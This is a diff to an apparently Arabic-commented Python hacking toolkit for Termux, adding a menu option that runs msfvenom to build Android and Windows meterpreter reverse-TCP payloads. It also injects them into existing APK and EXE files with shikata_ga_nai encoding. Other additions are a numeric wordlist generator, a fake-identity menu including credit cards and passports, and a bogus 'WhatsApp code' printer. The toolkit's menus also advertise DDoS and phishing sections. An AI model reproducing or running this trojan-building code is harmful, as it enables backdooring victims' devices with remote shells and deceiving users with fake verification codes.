@@ -1,14 +1,42 @@
 ####################################
 ####################################
+# من مكتبه time استدعينا داله sleep واختصرانها بأسم timout
 from time import sleep as timeout
 import time
+
+# مكتبه الخيوط او المهام المتعدده
+import threading
+
+# مكتبه خاصه بخوارزميات التشفير
 import base64
+#مكتبه خاصه بشبكات
 import socket
+# مكتبه نظام البايثون
 import sys
+# مكتبه تتعامل مع نظم التشغيل
 import os
+
+
+import subprocess
+
+import faker
+from faker import Faker
+from faker.providers import internet
+
+fake=Faker()
+fake.add_provider(internet)
+
+from pytube import YouTube
+
+import random
+
+import re
 #try:
+# امر خاص بمكتبه os
+# ونتيجته مسح الشاشه
 os.system('clear')
 ####################################
+# داله اعاده التشغيل الاداه
 def restart () :
     os.system('clear')
     print (' ')
@@ -59,9 +87,16 @@ def bnn () :
     print ("\033[1;31m                         ` | | | '                        ")
     print (' ')
 ####################################
+# داله التحميل
+#وتأخذ معاملين
+# nn لتحديد مده التحميل
+# t_ لطباعه اسم التحميل
+
 def t(nn,t_):
         print(t_)
         print('')
+# حلق تكراريه مداها 33
+
         for i in range(0,33):
                 i+=1
                 txt='\033[1;32m▒'*38
@@ -73,6 +108,7 @@ def t(nn,t_):
                 time.sleep(nn)
         print('')
 ####################################
+#
 def banner_v7x():
     print ("     \033[1;33m Ⅲ|☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷    ")
     time.sleep(0.1)
@@ -173,6 +209,7 @@ def banner_v7x():
     print ("     \033[1;33m ☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷☷    ")
     time.sleep(0.1)
 ####################################
+# واجهة الاداه الاساسيه
 def main (main):
     os.system ('clear')
     print (' \033[1;93mP \033[1;31m L  \033[1;34mE  \033[1;32mA  \033[1;34mS \033[1;32m E    \033[1;93mW   \033[1;32mA  \033[1;34mI  \033[1;93mT ...- ')
@@ -317,6 +354,8 @@ def main (main):
 ####################################
 #main (main)
 ####################################
+# واجهة تسجيل الدخول
+
 def homescreen () :
     print (' ')
     print ("\033[1;36mVisit:»» \033[1;33m >> https://t.me/Arab_heroes <<\033[1;36m To Get a Free Password... ")
@@ -356,6 +395,7 @@ def v7x_banner () :
     time.sleep(0.3)
     print ('   - Welcome Back.. ')
 ####################################
+# قسم ادوات تيرمكس
 def termux_tools () :
     os.system ('clear')
     print ("  \033[1;31m __________ \033[1;36m _____ \033[1;35m ______     \033[1;34m ___    ___ \033[1;33m __    __  \033[1;32m__     ___     ")
@@ -1079,6 +1119,7 @@ def linux_banner () :
     print (" ")
     timeout(0.1)
 ####################################
+# قسم توزيعات لينكس
 def linux_list () :
     timeout(0.1)
     print ("\033[1;36m  _________________________________________________________")
@@ -1199,6 +1240,7 @@ def linux_list () :
         t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
         restart ()
 #oooooooooooooooooooooooooooooooooooooooooo
+# قسم ادوات هجوم ddos
 def dos () :
     os.system ('clear')
     print ('\033[1;33m   _____  \033[1;32m _____  \033[1;31m _____  \033[1;33m                           ')
@@ -1323,6 +1365,7 @@ def dos () :
     else:
         restart ()
 ####################################
+# قسم ادوات جمع المعلومات
 def info () :
     os.system ('clear')
     print ("\033[1;91m          _   __   _   _____   _____              ")
@@ -1488,6 +1531,7 @@ def info () :
         os.system ('clear')
         restart ()
 #########################################
+# قسم ادوات الفحص
 def scan () :
     print ("\033[1;97m    _____   _____       ___   __   _                       ")
     timeout(0.1)
@@ -1675,6 +1719,7 @@ def scan () :
     else:
         restart ()
 #000000000000000000000000lllllllllllllllllllllllllllllllllll
+# قسم ادوات التصيد واهندسه الاجتامعيه
 def social () :
 
     print ("\033[1;31m  ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╗")
@@ -1839,6 +1884,8 @@ def social () :
         t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
         restart ()
 #ppppppppppppppppppppppppppp
+# قسم اداه metasploit
+
 def v7x_meta () :
     print ('\033[1;33m  REPAIR \033[1;36m  ___  ___ \033[1;36m  _____ \033[1;36m  _____   \033[1;32m   ___  ')
     timeout(0.1)
@@ -1924,6 +1971,20 @@ def v7x_meta () :
     timeout(0.1)
     print ("\033[1;31m  ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╝")
     timeout(0.1)
+    print ("\033[1;31m   |-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-| ")
+    timeout(0.1)
+    print ("\033[1;31m  ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╗")
+    timeout(0.1)
+    print ("\033[1;31m  ╢\033[1;36m          V7x Payload Genrator \033[1;32m[\033[1;33m 5 \033[1;32m]       \033[1;31m    ╟")
+    timeout(0.1)
+    print ("\033[1;31m  ╢                                               ╟")
+    timeout(0.1)
+    print ("\033[1;31m  ╢\033[1;33m            make metasploit payload           \033[1;31m ╟")
+    timeout(0.1)
+    print ("\033[1;31m  ╢                                               ╟")
+    timeout(0.1)
+    print ("\033[1;31m  ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╝")
+    timeout(0.1)
     print ("\033[1;31m           |-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|            ")
     timeout(0.1)
     print ("\033[1;31m          ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╗")
@@ -1982,6 +2043,103 @@ def v7x_meta () :
         os.system ("pg_ctl -D $PREFIX/var/lib/postgresql")
         print ('Done.....')
         restart ()
+    elif v7x_meta == '5':
+        t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+        os.system("clear")
+        print ("""
+
+[1] android payload
+[2] windows payload
+[3] inject payload into apk
+[4] inject payload into exe
+[5] install requirement packges
+[00] return to main
+
+""")
+        print ('\033[1;32mFor Example, Choose a Number \033[1;31m1,2,3....')
+        i=input("\033[1;33mGive Me a Command To Execute It..?\033[1;31m (0_0)\033[1;33m »»» ")
+
+
+        if i == '1' :
+
+            t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+            ip=input("enter your ip >> ")
+            port=input("enter your port >> ")
+            print("\n example")
+            print("/sdcard/name.apk\n")
+            outp=input("enter output >>")
+            subprocess.run(f"msfvenom -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o {outp}",shell=True)
+            restart ()
+
+        elif i == '2' :
+
+            t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+            ip=input("enter your ip >> ")
+            port=input("enter your port >> ")
+            print("\n example")
+            print("/Desktop/name.exe\n")
+            outp=input("enter output >> ")
+            x=subprocess.run(f"msfvenom -p windows/meterpreter/reverse_tcp lhost={ip} lport={port} -o {outp}",shell=True)
+            restart ()
+        elif i == '3' :
+
+            t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+            print("\n example")
+            print("/sdcard/name.apk\n")
+            a=input("apk path >> ")
+            ip=input("enter your ip >> ")
+            port=input("enter your port >> ")
+            print("\n example")
+            print("/sdcard/name.apk\n")
+            outp=input("enter output >> ")
+            subprocess.run(f"msfvenom -x {a} -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o {outp}",shell=True)
+            restart ()
+
+
+
+        elif i == '4' :
+            t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+            print("\n example")
+            print("/Desktop/name.exe\n")
+            a=input("apk path >> ")
+            ip=input("enter your ip >> ")
+            port=input("enter your port >> ")
+            print("\n example")
+            print("/Desktop/name.exe\n")
+            outp=input("enter output >> ")
+            subprocess.run(rf'msfvenom -a x86 --platform windows -x {a} -k -p windows/meterpreter/reverse_tcp lhost={ip} lport={port} -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o {outp}',shell=True)
+            restart ()
+
+
+
+        elif i == '5':
+            t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+            os.system("""
+clear
+apt update && apt upgrade
+clear
+apt install zipalign -y
+clear
+apt install apktool -y
+clear
+apt install apksigner -y
+clear
+apt-get install open-jdk17 -y
+clear
+            """)
+            restart ()
+
+        elif i == '00':
+            t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+            restart ()
+
+        else:
+            restart ()
+
+
+
+
+
     else:
         t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
         restart ()
@@ -1992,6 +2150,7 @@ def restart_hash () :
         os.system('clear')
         run_hash()
 ####################################
+# قسم التشفير
 def pppP():
 	os.system('clear')
 	print (' ')
@@ -2051,6 +2210,7 @@ def t(nn,t_):
 		time.sleep(nn)
 	print('')
 ####################################
+#قسم التشفير
 def Encode_py():
 	input_file =input ('\n\033[1;33m[ Enter path file ]\n\npath = > \033[1;36m ')
 	output_file = input_file
@@ -2077,7 +2237,7 @@ def Encode_py():
 		time.sleep(2)
 		run_hash()
 ####################################
-
+# قسم فك التشفير
 def Decode_py():
 	input_file =input('\n\033[1;33m[ Enter path file ]\n\npath = > \033[1;37m ')
 	output_file = input_file
@@ -2115,6 +2275,7 @@ def run_hash():
 		time.sleep(0.5)
 		restart_hash ()
 ####################################
+# معلومات حول الاداه
 def about  () :
     os.system ('clear')
     bnn ()
@@ -2186,48 +2347,377 @@ def about  () :
     else:
         restart ()
 ####################################
+def VidDownload():
+    time.sleep(0.1)
+    print ("\033[1;31m╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╗")
+    time.sleep(0.1)
+    print ("\033[1;31m╢                                                           ╟")
+    time.sleep(0.1)
+    print ("\033[1;31m╢      \033[1;33m      WELCOME  TO  V7X  VIDEO DOWNLOAD            \033[1;31m   ╟")
+    time.sleep(0.1)
+    print ("\033[1;31m╢                                                           ╟")
+    time.sleep(0.1)
+    print ("\033[1;31m╢======[]>\033[1;32m DOWNLOAD VIDEO \033[1;31m[ \033[1;33m2 \033[1;31m]                              ╟")
+    time.sleep(0.1)
+    print ("\033[1;31m╢                                                           ╟")
+    time.sleep(0.1)
+    print ("\033[1;31m╢                                                           ╟")
+    time.sleep(0.1)
+    print ("\033[1;31m╢===[]>\033[1;32m EXIT V7X VIDEO    \033[1;31m[\033[1;33m 2 \033[1;31m]                              ╟")
+    time.sleep(0.1)
+    print ("\033[1;31m╢                                                           ╟")
+    time.sleep(0.1)
+    print ("\033[1;31m╢ \033[1;33mChoose a Number 1,2,3..                       \033[1;31m            ╟")
+    time.sleep(0.1)
+    print ("\033[1;31m╢                                                           ╟")
+    print ('\033[1;32mFor Example, Choose a Number \033[1;31m1,2,3....')
+    nput=input("\033[1;33mGive Me a Command To Execute It..?\033[1;31m (0_0)\033[1;33m »»» ")
+    if nput=='1':
+        t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+        link=input("Input url >> ")
+        vid=YouTube(link)
+        dw=vid.streams.get_highest_resolution()
+        try:
+            dw.download()
+        except:
+            print("an error has occurred")
+            t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+            restart ()
+        print("download is completed successfully")
+        t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+        restart ()
+    elif nput=='2':
+        t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+        restart ()
+    else:
+
+        t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+        restart ()
+
+
+####################################
+def FData () :
+    print ("""
+[1] fake credit card
+[2] fake profile
+[3] fake number
+[4] fake address
+[5] fake company
+[6] fake domain
+[7] fake url
+[8] fake email
+[9] fake passport
+[10] random fake private ipv4
+[11] random fake public ipv4
+[12] random fake ipv6
+[13] random fake mac
+[14] random fake password
+[15] random fake binary
+[16] random fake sha256
+[17] random fake sha1
+[18] random fake md5
+[00] back to main
+    """)
+    while True:
+
+        i=input(">>> ")
+
+
+        if i == '1':
+            print("""
+
+
+            """)
+            print(fake.credit_card_full())
+
+
+
+        elif i =='2':
+            print("""
+
+
+            """)
+            l=fake.simple_profile().items()
+            for i,j in l:
+                print(i,j)
+
+
+
+        elif i =='3':
+            print("""
+
+
+            """)
+            print(fake.phone_number())
+
+
+        elif i =='4':
+            print("""
+
+
+            """)
+            print(fake.address())
+
+
+
+
+        elif i =='5':
+            print("""
+
+
+            """)
+            print(fake.company())
+
+
+        elif i =='6':
+            print("""
+
+
+            """)
+            print(fake.domain_name())
+
+
+
+        elif i =='7':
+            print("""
+
+
+            """)
+            print(fake.url())
+
+
+
+        elif i =='8':
+            print("""
+
+
+            """)
+            print(fake.safe_email())
+
+
+
+        elif i =='9':
+            print("""
+
+
+            """)
+            print(fake.passport_full())
+
+
+
+
+        elif i =='10':
+            print("""
+
+
+            """)
+            print(fake.ipv4_private())
+
+
+
+        elif i =='11':
+            print("""
+
+
+            """)
+            print(fake.ipv4_public())
+
+
+
+
+
+        elif i =='12':
+            print("""
+
+
+            """)
+            print(fake.ipv6())
+
+
+
+        elif i =='13':
+            print("""
+
+
+            """)
+            print(fake.mac_address())
+
+
+
+        elif i =='14':
+            print("""
+
+
+            """)
+            print(fake.password(length=10, special_chars=True, digits=True, upper_case=True,lower_case=True))
+
+
+        elif i =='15':
+            print("""
+
+
+            """)
+            print(fake.binary())
+
+
+
+        elif i =='16':
+            print("""
+
+
+            """)
+            print(fake.sha256())
+
+
+
+        elif i =='17':
+            print("""
+
+
+            """)
+            print(fake.sha1())
+
+
+
+
+        elif i =='18':
+            print("""
+
+
+            """)
+            print(fake.md5())
+
+        elif i == '00':
+            t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+            restart ()
+
+        else:
+            restart ()
+
+
+
+
+
+
+####################################
+def PassGen () :
+
+    print ("example 10000000")
+    i1=input("password start >> ")
+    i1=int(i1)
+
+    print("example 99999999")
+    i2=input("password end >> ")
+    i2=int(i2)
+
+
+
+    x=open("passlis.txt","w")
+    sys.stdout = x
+
+
+    while i1<i2: # i1=100 ,i2= 900
+
+        i1=i1+1 #i1=101, ... 900
+        print(i1) #100
+
+
+    sys.stdout.close()
+    sys.stdout=sys.__stdout__
+    x.close()
+    restart ()
+
+
+
+####################################
+def WA () :
+
+    r=random.randint(000000,999999)
+
+
+
+    print("type 00 to exit \n")
+
+    i=input("enter a number >> ")
+    m="^[0-9]{9,12}$"
+    rg=re.match(m,i)
+
+
+    if i == '00':
+        t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+        restart ()
+
+
+    if rg != None:
+
+        print(f"whatsapp code: {r}")
+        WA ()
+
+    else:
+        print("error")
+        t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+        restart ()
+
+####################################
+# الواجهة الرئيسيه
 def home_main () :
+
     timeout(0.1)
-    print ("\033[1;31m  ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗         ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗")
-    print ("\033[1;31m  ╢                      ╟         ╢                      ╟")
-    print ("\033[1;31m  ╢\033[1;33m  -TERMUX  TOOLS \033[1;32m [\033[1;31m1\033[1;32m]\033[1;31m ╟--[\033[1;33mV7x\033[1;31m]--╢\033[1;33m-LINUX ON ANDROID \033[1;32m[\033[1;31m2\033[1;32m] \033[1;31m╟")
-    print ("\033[1;31m  ╢                      ╟         ╢                      ╟")
-    print ("\033[1;31m  ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝         ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝")
+    print ("\033[1;31m  ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗         ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗")
+    print ("\033[1;31m  ╢                        ╟         ╢                        ╟")
+    print ("\033[1;31m  ╢\033[1;33m  -TERMUX  TOOLS   \033[1;32m [\033[1;31m1\033[1;32m]\033[1;31m ╟--[\033[1;33mV7x\033[1;31m]--╢\033[1;33m-LINUX ON ANDROID \033[1;32m[\033[1;31m2\033[1;32m]   \033[1;31m╟")
+    print ("\033[1;31m  ╢                        ╟         ╢                        ╟")
+    print ("\033[1;31m  ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝         ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝")
     timeout(0.1)
-    print ("\033[1;31m   |-|-|-|-|-|-|-|-|-|-|-|-V7X-Team-|-|-|-|-|-|-|-|-|-|-|")
-    print ("\033[1;31m  ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗         ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗")
-    print ("\033[1;31m  ╢                      ╟         ╢                      ╟")
-    print ("\033[1;31m  ╢\033[1;33m-DOS,DDOS ATTACKS\033[1;32m [\033[1;31m3\033[1;32m]\033[1;31m ╟--[\033[1;33mV7x\033[1;31m]--╢\033[1;33m -INFO GATHERING  \033[1;32m[\033[1;31m4\033[1;32m] \033[1;31m╟")
-    print ("\033[1;31m  ╢                      ╟         ╢                      ╟")
-    print ("\033[1;31m  ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝         ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝")
+    print ("\033[1;31m   |-|-|-|-|-|-|-|-|-|-|-|-|-V7X-Team-|-|-|-|-|-|-|-|-|-|-|-|")
+    print ("\033[1;31m  ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗         ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗")
+    print ("\033[1;31m  ╢                        ╟         ╢                        ╟")
+    print ("\033[1;31m  ╢\033[1;33m-DOS,DDOS ATTACKS  \033[1;32m [\033[1;31m3\033[1;32m]\033[1;31m ╟--[\033[1;33mV7x\033[1;31m]--╢\033[1;33m -INFO GATHERING  \033[1;32m[\033[1;31m4\033[1;32m]   \033[1;31m╟")
+    print ("\033[1;31m  ╢                        ╟         ╢                        ╟")
+    print ("\033[1;31m  ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝         ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝")
     timeout(0.1)
-    print ("\033[1;31m   |-|-|-|-|-|-|-|-|-|-|-|-V7X-Team-|-|-|-|-|-|-|-|-|-|-|")
-    print ("\033[1;31m  ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗         ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗")
-    print ("\033[1;31m  ╢                      ╟         ╢                      ╟")
-    print ("\033[1;31m  ╢\033[1;33m-SCAN--EVERYTHING \033[1;32m[\033[1;31m5\033[1;32m]\033[1;31m ╟--[\033[1;33mV7x\033[1;31m]--╢\033[1;33m -SOCIAL ENGNEER  \033[1;32m[\033[1;31m6\033[1;32m] \033[1;31m╟")
-    print ("\033[1;31m  ╢                      ╟         ╢                      ╟")
-    print ("\033[1;31m  ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝         ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝")
+    print ("\033[1;31m   |-|-|-|-|-|-|-|-|-|-|-|-|-V7X-Team-|-|-|-|-|-|-|-|-|-|-|-|")
+    print ("\033[1;31m  ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗         ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗")
+    print ("\033[1;31m  ╢                        ╟         ╢                        ╟")
+    print ("\033[1;31m  ╢\033[1;33m-SCAN--EVERYTHING   \033[1;32m[\033[1;31m5\033[1;32m]\033[1;31m ╟--[\033[1;33mV7x\033[1;31m]--╢\033[1;33m -SOCIAL ENGNEER  \033[1;32m[\033[1;31m6\033[1;32m]   \033[1;31m╟")
+    print ("\033[1;31m  ╢                        ╟         ╢                        ╟")
+    print ("\033[1;31m  ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝         ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝")
     timeout(0.1)
-    print ("\033[1;31m   |-|-|-|-|-|-|-|-|-|-|-|-V7X-Team-|-|-|-|-|-|-|-|-|-|-|")
-    print ("\033[1;31m  ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗         ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗")
-    print ("\033[1;31m  ╢                      ╟         ╢                      ╟")
-    print ("\033[1;31m  ╢\033[1;33m-V7X [MeTaSpLoIt] \033[1;32m[\033[1;31m7\033[1;32m]\033[1;31m ╟--[\033[1;33mV7x\033[1;31m]--╢\033[1;33m -HASH AnyThing   \033[1;32m[\033[1;31m8\033[1;32m] \033[1;31m╟")
-    print ("\033[1;31m  ╢                      ╟         ╢                      ╟")
-    print ("\033[1;31m  ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝         ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝")
+    print ("\033[1;31m   |-|-|-|-|-|-|-|-|-|-|-|-|-V7X-Team-|-|-|-|-|-|-|-|-|-|-|-|")
+    print ("\033[1;31m  ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗         ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗")
+    print ("\033[1;31m  ╢                        ╟         ╢                        ╟")
+    print ("\033[1;31m  ╢\033[1;33m-V7X [MeTaSpLoIt]   \033[1;32m[\033[1;31m7\033[1;32m]\033[1;31m ╟--[\033[1;33mV7x\033[1;31m]--╢\033[1;33m -HASH AnyThing   \033[1;32m[\033[1;31m8\033[1;32m]   \033[1;31m╟")
+    print ("\033[1;31m  ╢                        ╟         ╢                        ╟")
+    print ("\033[1;31m  ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝         ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝")
     timeout(0.1)
-    print ("\033[1;31m   |-|-|-|-|-|-|-|-|-|-|-|-V7X-Team-|-|-|-|-|-|-|-|-|-|-|")
-    print ("\033[1;31m  ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗         ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗")
-    print ("\033[1;31m  ╢                      ╟         ╢                      ╟")
-    print ("\033[1;31m  ╢\033[1;33m -INFO  ABOUT US  \033[1;32m[\033[1;31m9\033[1;32m]\033[1;31m ╟--[\033[1;33mV7x\033[1;31m]--╢\033[1;33m -EXIT THE  V7X  \033[1;32m[\033[1;31m10\033[1;32m] \033[1;31m╟")
-    print ("\033[1;31m  ╢                      ╟         ╢                      ╟")
-    print ("\033[1;31m  ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝         ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝")
+    print ("\033[1;31m   |-|-|-|-|-|-|-|-|-|-|-|-|-V7X-Team-|-|-|-|-|-|-|-|-|-|-|-|")
+    print ("\033[1;31m  ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗         ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗")
+    print ("\033[1;31m  ╢                        ╟         ╢                        ╟")
+    print ("\033[1;31m  ╢\033[1;33m-YT VID DOWNLOAD    \033[1;32m[\033[1;31m9\033[1;32m]\033[1;31m ╟--[\033[1;33mV7x\033[1;31m]--╢\033[1;33m-RANDOM & FAKE DATA\033[1;32m[\033[1;31m10\033[1;32m] \033[1;31m╟")
+    print ("\033[1;31m  ╢                        ╟         ╢                        ╟")
+    print ("\033[1;31m  ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝         ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝")
     timeout(0.1)
-    print ("\033[1;31m             |-|-|-|-|-|-|-V7XTeam-|-|-|-|-|-|-|")
-    print ("\033[1;31m            ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╗                  ")
-    print ("\033[1;31m            ╢                                     ╟                  ")
-    print ("\033[1;31m     --==|||╢ \033[1;33mREPAIR PROBLEMS - REPAIR TERMUX\033[1;32m[\033[1;31m11\033[1;32m] \033[1;31m╟|||==--          ")
-    print ("\033[1;31m            ╢                                     ╟                  ")
-    print ("\033[1;31m            ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╝                  ")
+    print ("\033[1;31m   |-|-|-|-|-|-|-|-|-|-|-|-|-V7X-Team-|-|-|-|-|-|-|-|-|-|-|-|")
+    print ("\033[1;31m  ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗         ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗")
+    print ("\033[1;31m  ╢                        ╟         ╢                        ╟")
+    print ("\033[1;31m  ╢\033[1;33m-PASSWORD GENRATOR \033[1;32m[\033[1;31m11\033[1;32m]\033[1;31m ╟--[\033[1;33mV7x\033[1;31m]--╢\033[1;33m -WHATSAPP CODE  \033[1;32m[\033[1;31m12\033[1;32m]   \033[1;31m╟")
+    print ("\033[1;31m  ╢                        ╟         ╢                        ╟")
+    print ("\033[1;31m  ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝         ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝")
+    timeout(0.1)
+    print ("\033[1;31m   |-|-|-|-|-|-|-|-|-|-|-|-|-V7X-Team-|-|-|-|-|-|-|-|-|-|-|-|")
+    print ("\033[1;31m  ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗         ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗")
+    print ("\033[1;31m  ╢                        ╟         ╢                        ╟")
+    print ("\033[1;31m  ╢\033[1;33m -INFO  ABOUT US   \033[1;32m[\033[1;31m13\033[1;32m]\033[1;31m ╟--[\033[1;33mV7x\033[1;31m]--╢\033[1;33m -EXIT THE  V7X  \033[1;32m[\033[1;31m14\033[1;32m]   \033[1;31m╟")
+    print ("\033[1;31m  ╢                        ╟         ╢                        ╟")
+    print ("\033[1;31m  ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝         ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝")
+
+    timeout(0.1)
+    print ("\033[1;31m             |-|-|-|-|-|-|-|-V7XTeam-|-|-|-|-|-|-|-|")
+    print ("\033[1;31m            ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╗                  ")
+    print ("\033[1;31m            ╢                                       ╟                  ")
+    print ("\033[1;31m     --==|||╢ \033[1;33mREPAIR PROBLEMS - REPAIR TERMUX  \033[1;32m[\033[1;31m15\033[1;32m] \033[1;31m╟|||==--          ")
+    print ("\033[1;31m            ╢                                       ╟                  ")
+    print ("\033[1;31m            ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╝                  ")
     print (' ')
     time.sleep(0.1)
     print ('\033[1;32mFor Example, Choose a Number \033[1;31m1,2,3,4,5...') 
